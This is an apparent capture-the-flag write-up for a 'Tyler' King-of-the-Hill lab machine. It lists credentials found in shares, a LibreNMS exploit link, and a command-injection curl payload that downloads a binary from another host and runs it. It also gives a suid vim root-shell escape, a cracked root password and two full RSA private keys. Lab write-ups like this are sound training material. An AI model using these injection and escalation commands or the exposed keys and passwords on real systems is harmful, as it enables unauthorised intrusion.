# Tyler KOTH machine

Paths to foothold:

- under a samba share is a text file `alert.txt` with a password in it. these are the ssh'able creds of the narrator user: `narrator:X8JEETQmf3hkS65f`
- On port 8080 is an instance of LibreNMS, with the default credentials admin:admin. This can be exploited to get a reverse shell with https://www.exploit-db.com/exploits/47044
- On port 80 is a standard website, that has two subdirectories: upload and betatest
  - upload can have its code examined by viewing index.bak - it appears to be mildly restricted, with a randomised output
  - betatest is straight command execution, for any post with the following body: `submit=submit&user=;id`, the latter param being command injection into a system call.

  ```
  curl http://10.10.155.41/betatest/checkuser.php -d "submit=submit&user=;wget+10.10.53.33:1234/client+-O+/tmp/c+%26%26+chmod+777+/tmp/c+%26%26+/tmp/c"
  ```

Paths to root:

- vim has the suid bit set. `/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'` will prompt for the terminal, entering `xterm`, then give a root shell.
- there is a shadow.bak file under /var/backups
  - cracking this with -m 1800 reveals the root password: `iamgod$08`

## Flags

- /root/root.txt
- /home/narrator/user.txt
- /home/tdurden/user.txt
- /srv/public/flag.txt
- /centos_chroot/root/flag.txt

## Keys

TDurden's id_rsa:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAvtKk2o/D5bl3eKcmDTBjy2z9mU8IeCPIVQjZ5M2i+6F122aJ
VbXoTgmsMvgzoJ3HCBB1KjIBLzhBLPtrv/lKVsS+7dUEp8i7zKzCgJy1wUA869ri
cey44ZYvML+5yF/NxHKc1OzNm1YhhqV4cTgEGulHe6UVV3pIe9amSNtiO2YPzTz0
s7DG5tAkKyfUPidpLoLvxCuFULEdQjjLPu7LHdIJB0PD6KCx69fseE63/g0W/x9N
oY5dU2mefPQosZUEDVHx8y41557hO6rJXF/HOjnu7L+3vNPDPO2aJHYa4n1ma38A
sWmeeA+sVmHUknGMzCqi4dB0MTtyqJInEYEycQIDAQABAoIBACrKQX1hT6Rr+oZr
tPSwLTCouBVwy41lOL8YxQOxuSKEClGwpIs7x2P4d0zWq30Q5FjCmANmQy27h6H2
nyrlU+4xID9kzS5yrOows0zz1y4GoaKh6rVxR+QOMXbVB2wPT60FpnV4xIJYxhvT
bza0QPdn6EeptSdwnGBoudEMoPKAhVCvPx//oGK7FNH/OYp7iLIrgIi5cb0xCKUC
X/ZuifgBoYKim1hnLRnLVJPIn6ZZ3ZUYgaEo2TnMe5adtyEbPq1E/HwuHM4JAINu
QHoWEWPaLUKaekdV18sbiF6i1Bpc+V8CbesYZBXvvDs8uI6RIzXUSXD5ul7MZ4oK
89RxwgECgYEA40O7hIpZdUiuavnUr9LWknxK8xhQzqoffi8nVibJGmS7u/qDGBWO
ceC0iGpFxnAzpFYDAtL92LOD2sb83bLCHwhWVCctlE568D5P2XE84S7IWbRHLoEs
bBLaaHHI90XAGrhRvTFKMQHEl9tRykpnq6Ip9HqgB5KDHXGed45J9UkCgYEA1vNW
hPBdlU3w0RLf1PSiTrkdCzrwsGdAjYyswStnmXnBi4wNxWnzoo1uHWp6UiWVX3KD
/xtOsx+6eEOrhYvP+MyeWwY1bj4J6CIHHXuJRBPh4sJwgfRwlo43FnxFaMhW8S/5
nZGSaXMpLacVRQh2RNKiWU2hqe2eKZ9tPhYAW+kCgYBCLLfOaSaRUx+OgL6gj8jx
EIYWcO8erkTLTlmq6VJHgCt2GgTQH37BxAdtbVxx4rv2zyDDUsKdte/f5W898s45
kQjqKhpIg+2iRNKlYyax/xhRnn/Xl79inL7CCNfWwJWmciNC7rZGvNgMy8zuFWpI
fMiwqoAslEnfafUVpPX+GQKBgQDKugIVq2V31WSUq0pz3K3ftXMRDmvG0/rsBYtB
PKCe/VhvNo4ebIkd/GmoUK5BH7U7qhOX3Ldi9T+3AYuZjn19V+7aRobKDLTnPICd
a8/QZzgZ1+yohFRTipmmGVqVMq3dF7RCyfLehYCG0BidXRe+XTJFK5SXYcZT10r+
zV1VUQKBgDupvxWOhqf0md/nJ+oAC6WZWcFVp8HVYH2JVk3r+dTyTBu5AKcMVR/p
eu81pmX0Mb9/r715wKd7eDpymWjXiuo88EONbUlRErjdJQ0WuJkw9t//znCRmPBH
FLWlF0hgshMSf7zonVIdhrp23YiFK3ALxoxqGXRJOtfKQi3FDLwM
-----END RSA PRIVATE KEY-----
```

Narrator's id_rsa:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA1K2sm2qTl2aSKcmkCrUWXS9e090v6UvxF/W9Cpm/0ycPcmij
zvLltqIyM3j4ZtmFfpAUQ+Xg7YvE3SRRBZVw2G+x+QbIM6JgzkC5o5uD02FJGvOT
ouCiDb9QOtRCMNQ6r6H7QXNufX+yJ4L3bTi7UnhBtSn5oCjhfUhBkHxfYQt672gm
z4vjn2Ndtlov0poX5eaNeyyMLiohzDQv2I5dK+OvV+H50ZLD3esnRS7PsPG4k3lf
kB4lQp7NKrMF/Ye6c3CY9gGL8pAeDMTDYpBNDfLcBgz/cSLZUg4SYc6F0y/EKybT
1F3z6qK3spAuurOVQvSDqw4+1ZSPQSP23WtXyQIDAQABAoIBABh2SW4u2f8GCzXH
PZkFrybUtgGEZWheFcL9vtqjSI8O5RXxtzWsdoOFMGT/OwMJbfNauxn8LNzlwKT2
8mLEB5C9eCj+gLR/rsbKZw/MaWM8w13YOlj3oWwXXzEFDP/0yTM+XFnw3vqMX39v
7umfJtybfGNMCqxDR3xTfUcTJx1QMN8GjeFgNAAWYM7i7E83QfWfwWo/rcaNx1KN
FjJSmn0Qd7lcTLdgA2oHPAe6BvEq2P3EDY1ecWEvsMIbmM/cZsJLSdi/9HlqkRF8
xsrlB9Cz019o3mMog8356ibM2TOPik+cWumzLqu09ddza4VEfxT30xsXYnaYKDxu
wBPxaUkCgYEA/RQBzDU/Fy3nq1UYCTJMtni9Z6rOLzm3X1uAKNJmKq5mMEERnx6m
MA4YYun3yvkQbG4Mq2Mptm1uw3Yph8wQmKIszNrfNc97CVb0h20S6XSxOD3SXN49
Xut4GiKPMjS9gh/k/56l2j+yy366hOdkiNDj+C0oMBN9k+M5r+++g4sCgYEA1yJD
NQtAl/9K5ePh7pXbXd1PfRggJS69rqnhTm5BTQ8mzO8ldWdNNE+zC5MLl92m8lTv
V4yFoDmb1TU8+x8EY9CEHXnTKkfLB2VDN7Dk4P4iMGhh1U+fWXEOMDDhurYgR6R3
vdyInB3f6IVMfqvYYEe31eddnc3AWjwOZP6a7HsCgYBVwy7sxeqQb1T/4cFYdHw8
peQBuodOx69VmEtxCgPnWNx2Y8aV9qv4wv4Onx0C4q5nIFAY0Gz1TlZn1KY0R7ok
D2lBLrbPpHUccCRDtHnhNVNNLN4Z7JI9lWxI5wdBy0+hRi+zVE7+C/IKNfL9UPDn
0GpA0wS4bhJzSGBnN8aHCwKBgQCObvLMJb0IZU+zUOL+0VzBkorUKaruszmGcJbp
FHpLiKKJwDOuvUwSPEoweZSNYYTsoGsuLa0y3bFcwbi0El8XrrApy8SRE6NKLDMK
piWDCP6dyh4r2mGIGB/qrBJnSbmpdSyKGX6gze62xbpVi3TgmdsO1fXXSqf1lhl5
qE/uDQKBgQDgn76GuDlT7Itk8LEN+hn4Yup97oXpjMHSPrkZC8iRpxOuPYP0EEC1
t1Ywik0g6ceHw8v0cl5XPj7tRs2U6xy/4iQ2/fERjPCZmBZeO3dz0OCZamsEIWtb
tMshFFP1ppXtnVqtYWLYNa9rL3HZlzb8EsVxwpZqnKE9vO+SiuHdTg==
-----END RSA PRIVATE KEY-----
```
